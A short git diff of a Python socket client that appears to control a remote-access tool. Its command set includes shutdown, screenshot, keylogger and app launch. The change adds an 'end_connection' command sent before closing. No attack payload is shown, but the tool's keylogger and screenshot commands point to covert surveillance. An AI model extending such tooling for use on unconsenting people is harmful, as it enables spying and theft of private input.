@@ -3,6 +3,7 @@ import os
 import time
 
 # Commands
+CMD_END_CONNECTION = 'end_connection'
 CMD_SHUTDOWN = 'shutdown'
 CMD_TAKE_SCREENSHOT = 'screenshot'
 CMD_KEY_LOGGER = 'keylogger'
@@ -96,7 +97,8 @@ class Client:
           break
         elif cmd == '0':
           print("[EXIT] Exiting...")
-          self.socket.close()
+          # End connection
+          self.end_connection()
           break
       except ConnectionResetError:
         print("[ERROR] Connection reset")
@@ -167,6 +169,9 @@ class Client:
     self.socket.send(CMD_START_APP.encode())
     time.sleep(0.01)
     self.socket.send(app_name.encode())
+
+  def end_connection(self):
+    self.socket.send(CMD_END_CONNECTION.encode())
     
 
 
